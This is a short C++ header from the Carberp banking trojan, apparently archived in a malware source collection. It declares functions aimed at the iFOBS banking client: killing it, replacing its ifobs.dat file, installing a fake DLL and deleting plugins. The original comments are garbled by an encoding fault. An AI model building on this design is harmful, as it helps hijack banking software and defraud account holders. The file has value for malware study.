/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#ifndef IFobsH
#define IFobsH


namespace IFobs
{

bool Init( const char* appName );
DWORD WINAPI KillIFobs(void*);
//������� ���� ������� ifobs.dat
void CreateFileReplacing( const char* s );
DWORD WINAPI InstallFakeDll(void*);
//������� ����������� �������, ����� ��� ����� ����������
void DeletePlugins();

};


#endif //IFobsH
